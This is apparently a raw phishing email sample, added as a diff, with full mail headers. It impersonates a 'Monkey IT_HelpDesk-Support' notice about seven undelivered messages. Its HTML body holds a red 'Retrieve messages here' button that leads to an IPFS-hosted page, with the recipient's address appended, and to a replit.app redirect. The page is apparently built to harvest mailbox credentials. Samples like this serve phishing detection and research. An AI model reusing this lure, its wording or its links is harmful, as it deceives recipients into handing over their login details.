@@ -1,0 +1,134 @@
+Return-Path: adminairitri@mawglf.com
+Delivered-To: jose@monkey.org
+X-FDA: 81891103602.27.9972FAC
+Received: from mail.mawglf.com (mawglf.com [78.40.117.149])
+	by imf10.b.hostedemail.com (Postfix) with ESMTP id 4731FA0007
+	for <jose@monkey.org>; Wed, 13 Mar 2024 06:55:00 +0000 (UTC)
+Authentication-Results: imf10.b.hostedemail.com;	dkim=pass header.d=mawglf.com
+ header.s=202402 header.b=actO4PGb;	spf=pass (imf10.b.hostedemail.com: domain
+ of adminairitri@mawglf.com designates 78.40.117.149 as permitted sender)
+ smtp.mailfrom=adminairitri@mawglf.com;	dmarc=pass (policy=quarantine)
+ header.from=mawglf.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1710312900;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=iuEqSi4/ZExR6yaJMc91g/W9wmiTJWj7kCCgRDHcx2M=;
+	b=GO5aFXLIZR3krGxMkNqbFLne5AeRSCZZtx43/NQrAvg6ohUtXKN/keRCJ2fPIgLOt9qFLU
+	wQnliHbVECRU42V+FH3n96x0J9z8F6yA/Xv84JiBNlcpJ3FLT0qvLAEJ29kgIGfgQE9cUH
+	X76ssG6weumyfSo1WreIB2CwGAxFY/g=
+ARC-Authentication-Results: i=1;	imf10.b.hostedemail.com;	dkim=pass
+ header.d=mawglf.com header.s=202402 header.b=actO4PGb;	spf=pass
+ (imf10.b.hostedemail.com: domain of adminairitri@mawglf.com designates
+ 78.40.117.149 as permitted sender) smtp.mailfrom=adminairitri@mawglf.com;
+	dmarc=pass (policy=quarantine) header.from=mawglf.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1710312900; a=rsa-sha256;
+	cv=none;
+	b=wsy2K8M8xphf+6ZqC5VY8yjpZI0hZWDRmV57bw4yfaFdWX6QwiBjiWza6eAadjxCz16GgV
+	K/ZsU0zJ5x7124Dsj7HsmJvao5b5G9RyDOtZ4uftDu3ZxdtDwMrgwWBu1p7UUbX8qWc+u9
+	dewZfWfCWArYDDhKuwX/anl+NikgDTE=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=mawglf.com; s=202402;
+	t=1710312898; bh=iuEqSi4/ZExR6yaJMc91g/W9wmiTJWj7kCCgRDHcx2M=;
+	h=From:To:Subject:Date:From;
+	b=actO4PGbhG1nD2wLqU/ifTRMQ892fC5AITpD6mgOXXtGIm20l/xFx6sZXAWo+iohR
+	 ciasnlWGANvJhxaDDtc6Ehko5sbyVXCKMIiksCjghVcYG6lU+TzGJ1tAGov76ZCNRA
+	 7fb8pRgcX525sH7OYO688glQ1OgowEwKysfsV6KNEiv67auMeb/JGLm2NXPuFiZG0U
+	 IaL8VsJksDoNoxk1jKwktrudUJDB+VFGCECZRYj2K2TaB0C/Ic+n/68lGbTgixME9O
+	 WJqCASJyTaXggpO88gYmS6CV7HM+23L8IwRkasHPvxbyhzIWHnoNkbACk5DZ5mLNAK
+	 teAHasbPcq/bA==
+Received: from [127.0.0.1] (unknown [139.28.36.142])
+	by mail.mawglf.com (Postfix) with ESMTPSA id 5C3F3CB938
+	for <jose@monkey.org>; Wed, 13 Mar 2024 06:54:58 +0000 (UTC)
+Content-Type: text/html
+From: "Monkey IT_HelpDesk-Support" <adminairitri@mawglf.com>
+To: jose@monkey.org
+Subject: Attention: Email Delivery Report
+Message-ID: <70f1008a-d01f-bc5d-2c84-c9390d9115c6@mawglf.com>
+Content-Transfer-Encoding: quoted-printable
+Date: Wed, 13 Mar 2024 06:54:57 +0000
+MIME-Version: 1.0
+X-Rspamd-Queue-Id: 4731FA0007
+X-Stat-Signature: auxq14icw1zaemqdkzcz3xheke6ohd9t
+X-Rspam-User: 
+X-Spam-Status: No, score=3.37
+X-Rspamd-Server: rspam05
+X-HE-Tag: 1710312900-56326
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+kegSRg+QJKv2MJQVhM6Wn6yWj3qMRsIESo/zrptLJssR?=
+ =?utf-8?q?51JX5ExcB1VC0JqYupXvBCjsV/icgb4vidfDcypz+NJf0+ewHS4uNluwSCS/rzZA/?=
+ =?utf-8?q?b81RV6vF4esd+3Ut2p1ZXa8A+5XRrodstq3i2KQrsaz7viKj7kkduIdJpP3+emRt/?=
+ =?utf-8?q?WQ78rlgNc5oA1SfdMcl0VDLb5+J2jXwu2xdrISLTibWfyQ+7Wm48fIxnJwQbLtpY0?=
+ =?utf-8?q?00ISjFRyoADkjLyMx+eh0vHU6Syv7YQvlz9s9k9QH+alSDrOByuRLbTc70r8PTIJN?=
+ =?utf-8?q?5WjI/cWjQEut5QFb9bKEP4GtSHOU5h2eYXCI4+tFoQhjBOVHKh+ozPANh3s0xtvyF?=
+ =?utf-8?q?7eVCKQ3Ujm0ufwyKkckoio2PVv4TifFUzmfxPvphGiEZrg9GIopdGEWqpDfAPmu+D?=
+ =?utf-8?q?udySXGg2grIIpNTNfpi6L26ptQsBB0+Obcx/7Dx4gjH1IbF7KCQYzI1/CRclBREAM?=
+ =?utf-8?q?bRUA4Ikxu1isVKaeAMf1vp3tFUDJdlnkHmMPVsoG0j58I6NL2z6P7Y27JdPrRhhYj?=
+ =?utf-8?q?SaDaHG8ESFvMjNzkHTarT4FrADmgyJZ6r?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 71
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.=
+1001"></HEAD>
+<BODY>
+<DIV id=3D:ny class=3D"Ar Au Ao" style=3D"DISPLAY: =
+block">
+<DIV aria-expanded=3Dfalse spellcheck=3Dfalse role=3Dtextbox =
+tabIndex=3D1 aria-label=3D"Message Body" aria-multiline=3Dtrue =
+aria-controls=3D:1vt id=3D:o2 class=3D"Am aiL Al editable LW-avf tS-tW =
+tS-tY" hideFocus contentEditable=3Dtrue style=3D"DIRECTION: ltr; =
+MIN-HEIGHT: 246px" aria-owns=3D:1vt g_editable=3D"true">
+<DIV style=3D"BOX-SIZING: border-box"><SPAN style=3D"BOX-SIZING: =
+border-box; FONT-WEIGHT: bolder"><FONT style=3D"BOX-SIZING: border-box" =
+size=3D5><FONT color=3D#ff0000>MAIL SERVER</FONT><BR style=3D"BOX-SIZING: =
+border-box"></FONT></SPAN></DIV>
+<DIV style=3D"BOX-SIZING: border-box">
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: arial,helvetica,=
+sans-serif">
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: 15px; =
+FONT-FAMILY: -apple-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",=
+Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; =
+COLOR: rgb(32,31,30); MARGIN: 0px 0px 1em'><SPAN style=3D"BOX-SIZING: =
+border-box; FONT-WEIGHT: bolder">Hello jose <br>(7) incomming Messages =
+failed to deliver to your inbox&nbsp; due to system&nbsp;delay!</SPAN></P>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: =
+-apple-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,=
+sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; COLOR: =
+rgb(32,31,30); MARGIN: 0px 0px 1em'>You can retrieve to deliver your =
+messages below.</P>
+<TABLE style=3D'FONT-SIZE: 15px; FONT-FAMILY: =
+-apple-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,=
+sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; =
+BORDER-COLLAPSE: collapse; COLOR: rgb(32,31,30); font-feature-settings: =
+"liga" 0' cellSpacing=3D0 cellPadding=3D0 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: =
+border-box">
+<TD style=3D'BOX-SIZING: border-box; FONT-SIZE: 8px; =
+FONT-FAMILY: "segoe ui semibold","segoe ui",suwsb,arial,sans-serif; =
+VERTICAL-ALIGN: middle; COLOR: rgb(255,255,255); PADDING-BOTTOM: 10px; =
+PADDING-TOP: 10px; PADDING-LEFT: 16px; LINE-HEIGHT: 16px; PADDING-RIGHT: =
+16px' bgColor=3D#ff0000 rowSpan=3D3><FONT style=3D"BOX-SIZING: border-box" =
+color=3D#ffffff size=3D3 face=3D"Segoe UI Semibold">
+<A style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: baseline; COLOR: =
+rgb(255,255,255); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px;=
+ MARGIN: 0px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,0,0); =
+text-decoration-line: none" href=3D"https://cloudflare-ipfs.=
+com/ipfs/bafybeidcdgcgldyeek7vicxgraq6ucd4m2bf624mutxm2bou2z6zqwqs74/bilot.=
+html/#jose@monkey.org" rel=3Dnoreferrer target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://saintyourpro=
+blemtoomuch-pawanbhagchanda.replit.app/%23%5B%5B-Email-%5D%5D&amp;source=3D=
+gmail&amp;ust=3D1710240187139000&amp;usg=3DAOvVaw0kFRjfUEEBsaey2NEx1AbP">Re=
+trieve messages here</A></FONT></TD></TR></TBODY></TABLE></DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: arial,helvetica,=
+sans-serif"><BR style=3D"BOX-SIZING: border-box"></DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: arial,helvetica,=
+sans-serif">&copy; 2024 | |&nbsp;<A href=3D"http://ingenious-medical.com/" =
+target=3D_blank data-saferedirecturl=3D"https://www.google.com/url?=
+q=3Dhttp://ingenious-medical.com/&amp;source=3Dgmail&amp;ust=3D171024018713=
+9000&amp;usg=3DAOvVaw2SZ9oT6v69MNda-J6OMKul">Monkey</A>&nbsp;E-mail =
+Support</DIV></DIV></DIV></DIV></BODY></HTML>
+
